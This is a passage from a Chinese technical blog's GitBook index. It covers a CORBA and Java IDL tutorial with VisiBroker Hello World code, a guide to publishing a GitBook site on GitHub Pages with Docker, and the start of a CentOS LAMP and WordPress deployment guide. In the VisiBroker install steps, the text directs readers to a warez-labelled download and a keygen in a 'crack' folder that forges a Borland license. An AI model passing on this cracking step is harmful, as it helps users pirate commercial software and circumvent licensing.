Interface）提供了动态调用方法和动态实现方法。某些情况下客户预先不知道服务对象的接口信息，需要通过查询或者采用其他的手段获得服务对象的接口描述信息，然后使用DII动态调用ORB核心接口的方法来构造客户请求并发送到对象实现。在对象实现方可以使用DSI动态分发用户请求的机制，以便动态的处理客户方的请求。客户和对象实现所采用的方式并不一定要对应，也就是说，客户方支持的静态和动态两种调用方式，对象实现方支持的静态和动态两种实现方式，经过组合后得到的4种方式都可能出现。例如，客户方可能使用静态调用方式，而对象实现方使用动态构架接口，反之亦然。 在动态方式下，需要查询相应的服务对象的接口描述信息（在静态方式下，这些信息由IDL文件来描述），这些信息由接口库提供。接口库通常以IDL描述文件为其输入，将接口描述信息进行处理后存放在文件、数据库或者其他形式的存储机制中，并提供一组标准的调用接口供客户查询使用。服务对象的描述信息也由接口库提供。 4. CORBA的应用程序结构 上图为CORBA的应用程序结构，它显示了CORBA应用程序各部件间的调用关系，ORB在CORBA客户和服务器之间传递方法调用和相关信息。 在CORBA应用系统中主要分为两部分：一是位于应用程序服务器中的CORBA对象，另一个是应用使用的客户程序。这些客户程序通过CORBA技术使用CORBA对象提供的服务来完成其工作。CORBA规范定义了客户程序与服务程序中的对象如何进行通信的机制。 对象请求代理（ORB）负责处理它们之间的通信。ORB提供了支持分布式处理的机制：为请求查找具体的对象实现，让对象实现作好接收请求的准备，传送构成请求的数据等。客户所看到的接口完全独立于对象所在的物理位置，实现对象的编程语言，以及在对象的接口中没有反映出来的其他特性。ORB通过IDL程序框架或动态程序框架来定位相应的实现代码、传送参数，以及对对象实现的传送控制。 处理通信的对象分别称为存根和构架。客户端为存根（Stub），服务器端为构架（Skeleton）。在客户端，存根对象担当CORBA对象的代理，当客户程序调用CORBA对象的方法时，存根把调用传递给ORB，ORB使用Smart Agent程序定位CORBA服务器。在CORBA服务器上，ORB应用程序把调用传递给构架，构架ORB的通信需要经过BOA（Basic Object Adaptor ，基本对象适配器），CORBA服务器运行指定的过程，然后由相反的路径返回结果。 Smart Agent用来定位CORBA服务器。启动程序时，自动访问Smart Agent。如果要支持CORBA，应该在局域网的某台机器上运行Smart Agent，当然也可以启动多个Smart Agent，以提高系统的可靠性。当客户机或服务器启动时，它们通过广播消息寻找Smart Agent，因此无需事先知道Smart Agent的位置。ORB实际上是一组放在动态库orb-r.dll中的函数，用户很少直接调用该DLL中的函数，系统在必要的时候调用他们。当服务器启动时，ORB向Smart Agent注册CORBA服务器。 5. Java IDL简介 5.1. 认识IDL module helloidl{ interface Hello{ string sayHello(); }; }; 上述的代码就是一个简单的IDL。在IDL中，接口定义以分号结尾。 IDL只能用来表示接口而无法用来编程。IDL描述的CORBA对象必须要被实现，例如用C++或Java来实现。 将IDL翻译为Java编程语言的规则统称为Java编程语言的绑定（Java programming language binding）。语言绑定由OMG负责标准化，所有的CORBA提供商都必须使用相同的规则，将IDL的产品映射到特定的编程语言。 5.2. IDL中的几个重要概念 5.2.1. 异常 异常包含如下环节： （1）定义异常处理； （2）引发异常； （3）捕捉异常，异常处理。 其中环节（1）应该在OMG IDL中进行，（2）（3）环节应该在客户端对象实现中进行。 定义异常用exception关键字，抛出异常用raises关键字。下面是简单的IDL异常代码： interface Warehose{ exception BadCustomer {string reason;}; //自定义异常 ProductSeq find(in Customer c) raises BadCustomer; //抛出异常 }; [info] IDL编译器会将异常类型翻译为一个类。 5.2.2. 继承 用OMG IDL可定义继承、多重继承以及跨模块继承。使用冒号“:”表示继承。下面是简单的IDL继承代码： interface Book{ attribute string isbn; }; interface Book:Product{}; 5.2.3. 变量、常量与属性 在CORBA接口中不能使用变量。但可以包含常量，如： const int NUMBER = 404; 接口还可以包含属性。属性看起来就像实例变量，但它们其实是一对访问器（accessor）与改写器（mutator）方法的简化。相当于Java中的setXXX、getXXX。但如果属性声明为readonly，就不生成改写器方法。 5.2.4. in、out和inout参数的使用 定义一个方法时，对于参数传递，除了Java编程语言提供的选择之外，还有其他选择。每个参数都可以声明为in、out或者inout。 一个in参数仅仅是传递给方法，与Java中的参数传递机制相同。但是Java中没有与out参数类似的东西。方法在返回前，会在每一个out参数中保存一个值，而方法调用者可以取得保存在out参数中的值。 如果参数只是声明为out，那么方法就不应该指望该参数被初始化。如果参数声明为inout，那么调用者需要为方法提供参数的初始值，然后，该方法可以修改这个值，而调用者能够获取修改后的值。 在Java中，这些参数可由特殊的持有者类（holder class）来模拟，持有者类由Java IDL编译器生成。IDL编译器为每个接口生成一个后缀为Holder的类。每个持有者类都有一个被称为value的公共实例变量。 Holder结尾的类主要用于out类型的参数传递，其中通过xxxHolder.value值能得到返回的值。示例IDL代码如下所示： Product p; //接口 ProductHolder pHolder = new ProductHolder(); w.locate(descr, pHolder); //pHolder为out类型的参数，调用locate方法后，会将pHolder对象中的value属性赋值。 p = pHolder.value; //取得返回后的值 [info] IDL不支持方法重载，因此必须为每个方法采用不同的名称。对于一些基础类型，已经预定义了它们的持有者，如IntHolder、DoubleHolder等。 5.3. IDL元素与Java元素的映射关系 上图为IDL中的元素以及与Java中元素的映射关系。 OMG IDL中的基本数据类型包括：Long、Short、unsigned long、unsigned short、float、double、char、boolean、Octet、any（其中any可以用来和任何一种数据类型匹配，包括构造数据类型以及数组）。 构造数据类型包括：struct、union、enum、sequence、String。 在IDL中，可以用sequence定义大小可变的数组（相当于Java中的数组）。如果希望限定一维序列的上限，可采用sequence的方式来定义，还可以嵌套定义如sequence>在声明sequence的参数或返回值之前，必须先定义一个类型。例如，下面定义了一个\"产品序列\"的类型： typedef sequence ProductSeq; 然后就可以在方法声明中使用该类型了： interface Warehouse{ ProductSeq find(in Customer c); }; 6. CORBA接口开发入门 6.1. Borland VisiBroker Edition简介 Borland VisiBroker是市场上最流行的CORBA环境之一，目前最新版是6.5。它支持C＋＋和JAVA语言来开发CORBA应用程序，提供跨网络、跨硬件的应用和服务的交互功能。 并且由于它可以轻松地与包括CORBA2.6在内的所有ORB版本互操作，使得用Java编写CORBA应用时，不必学习IDL和其他CORBA特性，减少了开发者的学习负担；可以把已有的RMI应用移植到CORBA运行环境上，有效地利用了已有的开发资源。 6.2. 开发环境的安装 6.2.1. 安装JDK 由于Borland VisiBroker 6.5只支持JDK1.3.1或JDK1.4.1，更高的JDK版本不能够运行VisiBroker。 以下以JDK1.3.1_15为例，安装目录为C:\\Program Files\\Java\\jdk1.3.1_15。在“我的电脑 -- 属性 -- 高级 -- 环境变量 -- 系统变量”中设置以下三个变量值（若没有则创建）： JAVA_HOME：C:\\Program Files\\Java\\jdk1.3.1_15 Path：%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin CLASSPATH：.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar 若本已安装并配置好高版本的JDK，可以再安装JDK1.3.1或JDK1.4.1，然后把环境变量JAVA_HOME的值修改为JDK1.3或1.4的目录即可。 如下图所示，在DOS下执行命令“java -version”可查看当前JDK版本： 6.2.2. 安装Borland VisiBroker Edition 下载 Borland.Enterprise.Server.v6.5.AppServer.Edition-ZWTiSO.zip，解压得到 zkbsea65.bin，用虚拟光驱（假设盘符为G）打开该文件，以下为安装过程： （1）执行G:\\Windows\\installer.exe； （2）选择BES VisiBroker Edition； （3）安装目录选择D:\\software\\work\\VisiBroker； （4）一直点击“下一步”直到出现“安装”按钮，点击开始安装； （5）安装完成后会弹出一个界面要求注册License，点击“Cancle”按钮取消，安装成功； （6）运行cmd，执行G:\\crack>java -jar LicenseMaker_For_BES65.jar，然后选择D:\\software\\work\\VisiBroker\\var文件夹，点击确定后注册License成功； （7）备份D:\\software\\work\\VisiBroker\\var目录下的borland.lic文件（因为重启电脑可能会重写borland.lic，导致出现“Borland Enterprise Server License error”错误，无法执行start vbj Server）。 （8）检查和设置windows的系统环境变量（可选，在DOS下执行或直接写入“我的电脑 -- 属性 -- 高级 -- 环境变量 -- 系统变量”中）： set VBROKERDIR=D:\\software\\work\\VisiBroker set VBROKER_ADM=%VBROKERDIR%\\adm set BES_LIC_DIR=%VBROKERDIR%\\var set BES_LIC_DEFAULT_DIR=%VBROKERDIR%\\license set OSAGENT_PORT=14000 set Path=%VBROKERDIR%\\bin 6.2.3. 开发环境测试 可利用VisiBroker为用户提供的一些例子进行测试环境，测试步骤如下： （1）“开始 -- 运行 -- cmd”，进入DOS系统，然后使用cd命令进入目录D:\\software\\work\\VisiBroker\\examples\\vbe\\basic\\bank_agent，执行vbmake.bat； （2）执行osagent命令，运行智能代理服务，右下角会出现Smart Agent的运行图标； （3）执行start vbj Server，运行CORBA服务器程序，若执行成功则会出现如图 2-8所示的DOS框； （4）执行vbj Client duyh，运行CORBA客户端程序，若执行成功则会出现如图 2-9所示的DOS框； （5）测试完成。 6.3. CORBA版Hello World应用开发实例 6.3.1. 应用需求 客户端通过CORBA接口调用的方式，请求执行服务端中对象的方法，服务器返回相应的字串符给客户端。 6.3.2. 定义IDL 根据需求只定义一个接口和相应该的返回字串的方法，hello.idl文件的内容如下： //hello.idl module helloidl{ interface Hello{ string sayHello(); }; }; 把hello.idl文件保存到D:\\corba_test目录下。 6.3.3. IDL的编译与解释 “开始 -- 运行 -- cmd”，进入DOS系统，然后使用cd命令进入目录D:\\corba_test，执行命令“idl2java hello.idl”对hello.idl文件进行编译，编译成功后会在D:\\corba_test目录出现一个文件夹hello.idl，并且其中有7个java文件。 对生成的各个文件说明如下： _HelloStub.java：客户Hello对象的存根代码。 Hello.java：Hello接口声明。 HelloHelper.java：声明HelloHelper类，定义有用的实用工具方法。 HelloHolder.java：声明HelloHolder类，这为传递Hello对象提供容器。 HelloOperation.java：本接口说明hello.idl文件中的Hello接口中所定义的方法签名。 HelloPOA.java：服务器端Hello对象实央的POA服务参象代码。 HelloPOATie.java：通过使用tie机制，在服务器端用以实现Hello对象的类。 6.3.4. 编写Server端的接口实现代码 6.3.4.1. HelloImpl.java 引入了POA概念后，Server方的实现对象称为Servant，编写实现代码实际上就是对IDL定义的每个interface，都编写一个Servant，其中要实现interface中定义的每个方法。. 这里我们将Servant类定义为HelloImpl.java，代码如下： //HelloImpl.java import helloidl.*; public class HelloImpl extends HelloPOA { public String sayHello() { return \"\\nHello world !!\\n\"; } } 6.3.4.2. HelloServer.java Servant仅是实现代码，而Server是包含main()函数的可执行的代码。Server的主要任务就是创建所需的Servant，同时通知POA已准备就绪，可以接受客户方的请求。 新建一个文件HelloServer.java，代码如下： //HelloServer.java import org.omg.CORBA.*; import org.omg.PortableServer.*; public class HelloServer { public static void main(String args[]) { try { // 初始化ORB ORB orb = ORB.init(args, null); // 取得根POA的引用 POA rootPOA = POAHelper.narrow(orb .resolve_initial_references(\"RootPOA\")); // 持久的POA创建策略 org.omg.CORBA.Policy[] policies = { rootPOA.create_lifespan_policy(LifespanPolicyValue.PERSISTENT) }; // 使用正确的策略创建myPOA POA myPOA = rootPOA.create_POA(\"hello_world_poa\", rootPOA .the_POAManager(), policies); // 创建服务对象 HelloImpl managerServant = new HelloImpl(); orb.object_to_string(null); // 确定服务对ID byte[] managerId = \"HelloManager\".getBytes(); // 用myPOA上的ID激活服务对象 myPOA.activate_object_with_id(managerId, managerServant); // 激活POA管理器 rootPOA.the_POAManager().activate(); System.out.println(myPOA.servant_to_reference(managerServant) + \" is ready.\"); // 等待进入的请求 orb.run(); } catch (Exception e) { System.err.println(\"ERROR: \" + e); e.printStackTrace(System.out); } } } 6.3.5. 编写Client端的接口实现代码 6.3.5.1. HelloClient Client程序就是客户方的可执行程序，它需要使用到Server方的服务。 新建一个文件HelloClient.java，代码如下： //HelloClient.java import helloidl.*; import org.omg.CORBA.*; public class HelloClient { static Hello helloImpl; public static void main(String args[]) { try { // 初始化ORB ORB orb = ORB.init(args, null); // 得到一个管理器ID byte[] managerId = \"HelloManager\".getBytes(); // 找到一个对象管理器。给出POA全各及服务对象ID。 helloidl.Hello manager = helloidl.HelloHelper.bind(orb, \"/hello_world_poa\", managerId); // 输出结果 System.out.println(manager.sayHello()); } catch (Exception e) { System.out.println(\"ERROR : \" + e); e.printStackTrace(System.out); } } } 6.3.6. 程序的编译和运行 编译客户端和服务端程序并运行，步骤如下： （1）把3个java文件HelloImpl.java、HelloServer.java和HelloClient放到目录D:\\corba_test下； （2）“开始 -- 运行 -- cmd”，进入DOS系统，然后使用cd命令进入目录D:\\corba_test，然后执行命令“vbjc HelloClient.java”编译客户端代码，执行命令“vbjc HelloServer.java”编译服务端代码； （3）执行osagent命令，运行智能代理服务； （4）执行start vbj HelloServer，运行CORBA服务器程序； （5）执行vbj HelloClient，运行CORBA客户端程序，结果输出“Hello World!!”。 7. CORBA常用的四种服务简介 7.1. 名字服务 名字服务允许将一个或多个逻辑名与一个对象引用联结起来，并将名称存储在一个命名空间（namespace）中，也允许客户应用使用命名服务，以通过使用分配给对象的逻辑名称来取得该对象的引用。 相对于智能代理使用的平面型命名空间，命名服务则使用层次型的命名空间，结构类似于java中的包中的结构，如（com.xyz.corba）。 使用VisiBroker的命名服务中，对象实现使用NamingContext对象以将名称限制到它们所提供的对象。客户应用使用NamingContext来解析限制到对象引用的名称。 NamingContext通过rosolve方法取得逻辑Name中的对象引用，因为一个Name可以包含一个或多个NameComponent对象，所以解析能在NameComponent结构中来回移动，只要取其中的一个节点的对象引用，即可获得整个NameComponent结构的所有对象引用。 字串化的名称用于对应字串和CosNaming::Name，用“/”来分隔名称组件；用“.”来分隔id和kind属性；用“\\”来作转义字符。如： com/xyz/corba ... // 名称字串化\"com/xyz/corba\"的代码 NameComponent[] continentName = { new NameComponent(\"com\", \"\") }; NamingContext continentContext = rootNamingContext.bind_new_context(continentName); NameComponent[] departmentName = { new NameComponent(\"xyz\", \"\") }; NamingContext departmentContext = continentContext.bind_new_context(departmentName); NameComponent[] objectName = { new NameComponent(\"corba\", \"\") }; departmentContext.rebind(objectName,myPOA.servant_to_reference(managerServant)); ... 7.2. 事件服务 核心ORB支持的通信模型是实现客户端与服务器的一对一同步通信，通知服务则可支持更丰富的需求，包括： 支持分布/预订应用程序，如多对多 支持单向、异步和缓冲事件分布，其吞吐量远大于同步通信 对持服务质量，如事件/连接可靠性 支持事件筛选 TCP/IP用于实现接收者、提供者和事件通道之间的通信。分为“拉”和“推”的两种通信模型。事件通道使提供者和接收者不需确定对方的通信模型。 推式模型更为普遍。推型接收者将大多时间花费在事件的回路中，等待从ProxyPushSupplier而来的数据。 拉式模型是事件通道定期从提供者拉出数据，拉型提供者将大多时间花费在网络事件回路中，等待接收从ProxyPullConsumer发出的数据请求。 7.3. 通知服务 通知服务的实现模式跟事件服务类似。 7.4. 交易服务 “一手交钱，一手交货”是交易的基本原则，它的等价命题是既不能提了货却不给钱，又不能给了钱却没提货，在现实生活中，有许多对象之间的操作存在这种类似关系：要么这些操作全都进行，要么这些操作全都不进行，这种关系的操作就构成了事务（Transaction）。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/":{"url":"markdown/notes/website/","title":"网站建设","keywords":"","body":"网站建设网站建设 使用 GitBook 在 Github 搭建个人网站 LAMP环境 + WordPress 部署笔记 WordPress 插件推荐 加速访问 WordPress Mariadb 周期性崩溃处理记录 记一次 TTFB 的优化过程 禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/GitBook搭建个人网站.html":{"url":"markdown/notes/website/GitBook搭建个人网站.html","title":"使用 GitBook 在 Github 搭建个人网站","keywords":"","body":"使用 GitBook 在 Github 搭建个人网站前言传统的个人网站稍微有点技术含量的个人网站GitBook 简介为什么是 GitBook & GitHub搭建 GitBook 环境构建 GitBook 镜像初始化 GitBook 项目关于 GitBook 目录结构说明构建 GitBook 项目启动 GitBook 服务关于前文中 Docker 命令的参数的含义发布站点到 GitHub Page站点优化：安装 GitBook 插件自定义域名使用 GitBook 在 Github 搭建个人网站 前言 传统的个人网站 在某个知名门户下面注册一个子域名，定制个性化内容。 例如 QQ空间、 博客园、 CSDN 等等。 优点： 无技术门槛 免费 缺点： 站点风格受限： 只能使用有限的模板布置站点 文章数据无法直接迁移： 即使某些门户支持导出、也未必能导入到其他门户 稍微有点技术含量的个人网站 租用一台云服务器，搭建一个 HTTP 服务，在其中放入你想展示的内容。 优点： 完全个性化：理论上只要你想到的都可以实现 能够赚钱： 广告引流、付费内容等 站点数据能够迁移： 一般存储在数据库中 缺点： 收费： 租用个人云服务器最低配的差不多 ￥1000/年 其实并不能赚到什么钱： 　　· 百万流量广告引流？ 不好意思谷歌邮寄 PIN 码到国内 100% 丢件 　　· 内容付费？ 抱歉大部分人的文章并不足以让别人掏钱 非常繁琐的搭建过程和日常维护，来看一下你需要做什么： 　　· 申请域名、网站备案： 最快需要 1 个月 　　· 租用云服务器： 低配怕访问慢、高配怕财务困难 　　· 搭建 HTTP 服务： nginx、 apache 　　· 搭建数据库： MySQL、 MariaDB 　　· 搭建网站平台： wordpress、 Discuz! 　　· 网站平台模板/插件不好用： css、 js 各种魔改 　　· 安全加固： 后台被爆破、 前台被钓鱼 　　· 服务容灾： 进程挂起、 定期备份 　　· 访问加速： Redis缓存、 CDN 　　· 搜索引擎不收录： SEO、 提交链接 把这些都处理好之后，终于可以开始发表文章，一切似乎都很安逸很顺利。 但很多问题就是发生了： 写了几百篇文章之后，开始发现富文本编辑方式太呕心了 突然有一天某个内容解析插件升级之后，文章格式乱套了 突然某个 JS 链接被墙之后，发现 latex 公式变代码了 难道想安逸地发表一些文章真的这么困难吗？ 直到有一天我发现了 GitBook。 GitBook 简介 GitBook 是一个基于 Node.js 的命令行工具，支持 Markdown 和 AsciiDoc 两种语法格式，可以把这种格式的文本输出为 HTML、 PDF、 eBook 等格式的电子书。 事实上可以认为 GitBook 的本质就是一个文档格式转换工具。 GitBook 社区具有丰富的主题模块和插件模块，而且这些 主题/插件 都是开源的，大部分都可以从 GitHub 上找到，所以可以很简单地找到我们需要的 主题/插件 ，甚至能简单地对其进行微调。 为什么是 GitBook & GitHub 其实当知道 GitBook 可以把 Markdown 转换成 HTML 格式电子书之后，就基本可以确定这个组合了： GitHub 天然支持 Markdown 语法，可以直接使用 Markdown 编写文章 GitHub 可以借用 Git 对文章进行版本管理 GitHub 为每个仓库提供了 300M 免费空间的 GitHub Pages （只支持 HTML），足够用于发布个人的静态网站 GitBook 可以把 Markdown 文章转换成 HTML 电子书供 GitHub Pages 发布 极简主义： 程序员的网站不需要太多花哨的东西，文章才是核心，站点越简洁越美观 搭建 GitBook 环境 [warning] 　GitBook 在 3.2.3 版本之后就开始收费了，但是收费之后反而阉割了不少功能，不建议使用最新版 为了使得 GitBook 的运行环境可以固化在 3.2.3 版本，这里使用 Docker 实现。 且为了方便使用，我已将其打包成 Docker 镜像，其 Dockerfile 脚本已上传到 GitHub： gitbook-server-docker 。 注： 　因为 gitbook 服务是运行在 Docker 中，所以不论使用哪个平台，都要预装好 Docker 环境 　但是本文所使用的基础镜像是基于 Linux 的，因此 Docker in Windows 是无法直接安装的 　所以针对 Windows 10 ，推荐使用 WSL ( Windows Subsystem for Linux ) 　通过 WSL 安装 Ubuntu 系统，然后再在 Ubuntu 里面安装 Docker Deamon 　最后 Docker in Windows 做端口映射，就可以实现 Windows 到 Linux 的无缝对接 　具体的 Windows Docker 环境部署方法可参考 《简书： Win10 内置 Ubuntu 完美使用 Docker in Windows》 　至于 Linux 和 Mac 则简单得多，直接安装 Docker Deamon 即可使用，具体方法自行谷歌 构建 GitBook 镜像 首先安装 git 命令行工具，然后 clone 上述的 gitbook-server-docker 仓库到本地： git clone https://github.com/lyy289065406/gitbook-server-docker 在命令行环境下 打开本地仓库目录 。 Docker 脚本已经编排好在 ./Dockerfile 中，可以不修改直接使用。 构建 Docker 镜像（镜像名称 exp/gitbook-server 可根据 Docker 规范自定义修改）： docker build . -t exp/gitbook-server:latest 至此镜像已经安装完毕，下文主要是测试 GitBook 镜像是否可用。 初始化 GitBook 项目 在 Docker 镜像中执行命令 gitbook init： docker run --rm -v \"$PWD/gitbook:/gitbook\" exp/gitbook-server gitbook init 　该命令会自动创建默认的 GitBook 目录结构。 　实际效果就是在工作目录 ./gitbook 下创建两个符合 GitBook 语法的文件 README.md 和 SUMMARY.md 。 　更多的 GitBook 语法详见 《GitBook 学习笔记》 关于 GitBook 目录结构说明 exp-blog |-- .gitignore .............. [Git 过滤配置] |-- Dockerfile .............. [构建 GitBook 本地服务器的 Docker 脚本] |-- build.ps1 ............... [重新编译博客变更内容，并使其适用于 Github Pages（Windows 脚本）] |-- build.sh ................ [重新编译博客变更内容，并使其适用于 Github Pages（Linux 脚本）] |-- index.html .............. [Github Pages 首页（会自动跳转到博客首页）] |-- gitbook ................. [GitBook 的工作目录，存储博客数据] | |-- _book ............... [用 GitBook 编译生成的静态网站数据，用于本地测试（因含下划线不被 Github Pages 支持）] | |-- book ................ [用 build.ps1/sh 脚本所复制 _book 目录的镜像，用于 Github Pages 发布] | |-- res ................. [存储博客资源的目录] | |-- markdown ............ [存储博客文章的目录（只有 *.md 文件）] | |-- README.md ........... [博客介绍文档（固定文件）] | |-- SUMMARY.md .......... [博客目录索引（固定文件）] | |-- node_modules ........ [GitBook 的插件目录] | |-- book.json ........... [GitBook 的插件配置] | └-- package-lock.json ... [nodojs 插件依赖关系文件（安装插件时会自动更新）] |-- LICENSE ................. [版权说明] └-- README.md ............... [此仓库的说明文档] 构建 GitBook 项目 在 Docker 镜像中执行命令 gitbook build： docker run --rm -v \"$PWD/gitbook:/gitbook\" exp/gitbook-server gitbook build 　该命令会根据 GitBook 文件 README.md 和 SUMMARY.md 构建 html 项目 。 　实际效果就是在工作目录 ./gitbook 下构建目录名为 _book 的静态网页文件 。 　本地可以通过 ./gitbook/_book/index.html 测试访问 。 启动 GitBook 服务 在 Docker 镜像中执行命令 gitbook serve： docker run -d --rm -v \"$PWD/gitbook:/gitbook\" -p 4000:4000 exp/gitbook-server gitbook serve 该命令效果就是构建一个可以访问 ./gitbook/_book/index.html 的 Web 服务。 关于前文中 Docker 命令的参数的含义 docker run --rm -v \"$PWD/gitbook:/gitbook\" -p 4000:4000 exp/gitbook-server docker run：运行镜像 --rm：退出镜像后自动删除运行时产生的数据（此镜像目的是提供 GitBook 服务的运行环境，因此没必要保留数据） -v \"$PWD/gitbook:/gitbook\"：把本地工作目录 $PWD/gitbook 挂载到镜像的工作目录 /gitbook （这样运行 GitBook 期间的工作数据就会从本地映射到镜像内，即使镜像退出运行，数据依旧会保留在本地） -p 4000:4000：把镜像内 GitBook 的 4000 服务端口暴露到本地物理机的 4000 端口 exp/gitbook-server：目标镜像名称 ：要在镜像内执行的命令，如 gitbook serve 等，更多命令可见 gitbook-cli 发布站点到 GitHub Page 事实上只需要把前面通过 gitbook build 所生成的 _book 目录 commit 到 GitHub， 然后在 GitHub 仓库的 Settings 中启用 GitHub Page 即可。 这里需要注意的是： GitHub Page 不允许站点路径以下划线开头，因此在 commit 前需要把 _book 重命名为 book GitHub Page 的站点主页是仓库的根目录，而 GitBook 的站点主页是在 _book 目录下，为了统一主页，可以在 GitHub 仓库根目录添加一个 index.html 文件，内容如下： EXP-BLOG 站点优化：安装 GitBook 插件 GitBook 的精粹在于丰富的插件以扩展其功能，插件可通过工作目录下的 book.json 配置并控制，相关说明见 官方文档。 推荐 GitBook 安装的插件可参考 这份清单 。 根据插件命名约定，若 插件名称 为 prism ，则其对应 安装包名称 为 gitbook-plugin-prism 。 以 prism 插件为例，安装方式有两种： 通过 GitBook 安装：把插件名称 prism 添加到 book.json 的 plugins 列表，执行 gitbook install 命令 通过 nodejs 安装：执行 npm install gitbook-plugin-prism 命令安装指定插件，然后把插件名称 prism 配置到 book.json 的 plugins 列表使其生效 　方法一每次执行都会检查现有插件是否需要更新。 　方法二只有特定插件受影响，适合于存在自定义修改过插件代码的情况。 注意， Guthub Pages 不支持使用了 Octopress 框架的插件，详见 《About GitHub Pages and Jekyll》 。 若使用了这类插件，Guthub Pages 是无法发布成功的。 判定是不是使用了这类插件的方法也很简单： 提交变更内容后，点击 Github 仓库下的 branch 查看 master 分支 master 分支会提示最近提交内容的 Guthub Pages 构建情况 若构建失败，可以点击 Details 查看详情 假如提示 is not a recognised Liquid tag 说明就是采用了 Octopress 框架的插件 自定义域名 通过 GitHub Page 发布的站点有个问题，就是 URL 地址不方便记忆。 如果有申请个人域名的话，是可以自定义 GitHub Page 域名的。 首先需要购买域名解析服务，添加 CNAME 规则把个人域名解析到 GitHub Page，然后再在 GitHub Page 配置个人域名即可。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/WordPress部署笔记.html":{"url":"markdown/notes/website/WordPress部署笔记.html","title":"WordPress 部署笔记","keywords":"","body":"LAMP环境 + WordPress 部署笔记1. 前言2. 安装软件说明2.1. 关于MariaDB数据库2.2. 关于PHP版本3. LAMP环境安装3.1. 安装操作系统：Linux - CentOS Linux release 7.4.1708 (Core)3.2. 安装Apache/2.4.6 (CentOS)3.3. 安装MariaDB-5.5.563.4. 安装PHP 5.6.363.5. 安装phpMyAdmin3.6. 安装WordPress 4.9.4中文版3.7. 安装FTP3.8. 可选：安装防火墙firewalld4. 后话：几个重要的配置文件5. 资源下载LAMP环境 + WordPress 部署笔记 1. 前言 现在网上虽然有大量WAMP、LAMP、LNMP环境部署的文章，但是不少都过期了或者没有完整的体系、或者没有说明环境版本、再不然就是太罗嗦找不到部署重点。因为环境和版本的各种问题，我在云服务器上面部署的时候碰了不少壁。 这篇笔记是我在全新安装的、干净的Centos7.4系统的基础下，重复部署了5次LAMP环境之后总结出来的，尽量只罗列出安装环境所用到的每个命令步骤以及说明，不含多余的东西，安装目录也基本使用了默认目录，没有去改动，便于大家复制部署。 至于WAMP与LNMP不在本文讨论范围内，主要因为WAMP比较简单。而就个人而已，相比于Nginx更习惯Apache，所以最终选了LAMP。 2. 安装软件说明 英文缩写 释义 说明 适用平台 本地物理机/本地虚拟机/云服务器 本文使用的是 腾讯云CVM服务器 WAMP Windows + Apache + Mysql + PHP Web应用软件集成环境（Window系统） LNMP Linux + Nginx + Mysql + PHP Web应用软件集成环境（Linux系统） LAMP Linux + Apache + Mysql + PHP Web应用软件集成环境（Linux系统） L Linux系统 本文使用的版本号是Centos 7.4.1708 A Apache 本文使用的版本号是2.4.6 M MariaDB / Mysql 本文使用的是MariaDB 5.5.56 P PHP 本文使用的版本号是5.6.36 2.1. 关于MariaDB数据库 MariaDB是Mysql的分支版本，完全兼容Mysql。 本文的操作系统是基于Centos 的，Centos 默认使用的就是MarriDB。之所以不使用Mysql，是因为Mysql被Oracle收购后存在闭源风险，因此建议使用MariaDB。 2.2. 关于PHP版本 另外，出于系统安全起见，这里特别提及一下PHP的版本号问题： 2018年01月22日公布了一个 CVE-2018-5711: PHP GD库拒绝服务漏洞： https://help.aliyun.com/noticelist/articleid/20788282.html 大概意思就是若PHP开启了GD库模块，那么就有可能被一张恶意GIF搞到CPU满荷死机（现在WordPress普遍都会使用timthumb.php对缩略图进行缓存优化以加速网站访问，这个功能会用到GD库）。 受这个BUG影响的PHP版本： PHP 5 PHP 7.0 PHP 7.1 PHP 7.2 这篇文章我使用的是5.6.36版本。之所以没有选择最新的PHP 7.x版本，是因为LAMP环境下，PHP还要安装与之配套版本的phpMyAdmin让PHP访问数据库。而我没有刻意去找与 7.x配套的phpMyAdmin，所以用了5.6.36。其实5.x还是没什么所谓，只要注意不要安装有问题的版本就好。 顺便一提，windows环境还要区分线程安全版本和非线程安全版本，至于为什么自行百度。但本文说的是Linux环境，就无需考虑了。 3. LAMP环境安装 3.1. 安装操作系统：Linux - CentOS Linux release 7.4.1708 (Core) 操作系统安装过程略，因为无论是在本地物理机、虚拟机，还是在云服务器，都是可以傻瓜式安装，此处就不多言了。 查看系统版本号: cat /etc/redhat-release 更新操作系统（可选，建议）： yum clean all yum -y update 3.2. 安装Apache/2.4.6 (CentOS) 安装默认Apache： yum -y install httpd 查看Apache版本号： apachectl -v 启动Apache： systemctl start httpd 使得Apache开机启动： systemctl enable httpd 测试Apache是否安装成功，浏览器打开网址： http://127.0.0.1 注意，若打不开，检查下： ① 防火墙要开放80端口入网规则 ② 若是云服务器IP要改成公网地址 ③ 若是云服务器要配置安全组策略开放80端口 为WordPress开启mod_rewrite模块功能（用于支持“固定链接”和“站点网络”功能），使用vi打开Apache配置文件： vi /etc/httpd/conf/httpd.conf 定位到段修改下列语句，其他部分不用修改。 AllowOverride None 修改为 AllowOverride All 定位到段修改下列语句，其他部分不用修改。 AllowOverride None 修改为 AllowOverride All 定位到段修改下列语句，其他部分不用修改。 AllowOverride None 修改为 AllowOverride All 至此Apache安装完成。 注意（这些先记下来，不用动，后面有用）： ① 此时Centos会多了一个用户apache，用户组为apache。 ② Apache的html项目默认路径为： /var/www/html 3.3. 安装MariaDB-5.5.56 安装默认MariaDB： yum install mariadb-server mariadb 启动MariaDB： systemctl start mariadb 因首次安装，配置MariaDB： mysql_secure_installation 此时会问你几个问题： Enter current password for root (enter for none): 　　要求输入root用户当前密码，由于没有，直接回车不要输入任何东西，不然不能往下 Set root password? [Y/n] 　　是否设置root用户密码，选Y， 然后自己设置密码就是 Remove anonymous users? [Y/n] 　　是否移除anonymous 用户，选Y，这个用户仅用于测试，在服务器上可能有提权隐患 Disallow root login remotely? [Y/n] 　　是否禁止root用户远程登录，选Y， 为了安全起见，等下再建一个用户用于远程访问就是。 　　一般情况下服务器也不应该开放3306端口（除非要迁移数据），容易被攻击。 Remove test database and access to it? [Y/n] 　　是否移除测试数据库，选Y， 没什么用 Reload privilege tables now? [Y/n] 　　是否重载权限表使所有设置生效，选Y 使得MariaDB开机启动： systemctl enable mariadb 